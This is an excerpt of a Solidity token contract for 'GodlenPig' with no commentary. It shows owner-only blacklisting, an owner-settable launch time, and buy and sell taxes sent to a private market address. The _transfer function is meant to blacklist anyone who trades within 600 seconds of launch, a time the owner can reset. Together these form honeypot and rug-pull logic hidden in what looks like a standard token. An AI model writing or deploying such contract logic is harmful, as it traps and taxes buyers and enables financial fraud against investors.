...
contract Token is Context, Ownable, IERC20 {
    ...
    uint private _totalSupply = 1000000000000000 * (10 **_decimals);
    string private _name = "GodlenPig";
    string private _symbol = "GodlenPig";

    IUniswapV2Router02 public router;
    address public pair;

    uint public buyMarketTax = 10;
    uint public sellMarketTax = 12;
    uint256 public launchedAt = 0;

    address private market;

    constructor (address routerAddress, address marketAddress) {
    ...
    function setBlack(address account, bool value) public onlyOwner {
        _black[account] = value;
    }
    ...
    function setLaunched(uint value) public onlyOwner {
        launchedAt = value;
    }
    ...
    function _transfer(address sender, address recipient, uint amount) internal {
        ...
        require(!isBlack(sender) || !isBlack(recipient), "BEP20: transfer from the block address");

        if (block.timestamp <= launchedAt + 600) {
            setBlack(_msgSender(), true);
        }
        ...
        if (isSell) {
            marketTax = amount.mul(sellMarketTax).div(100);
        }
        else {
            marketTax = amount.mul(buyMarketTax).div(100);
        }
        ...
        uint256 netAmount = amount - marketTax;
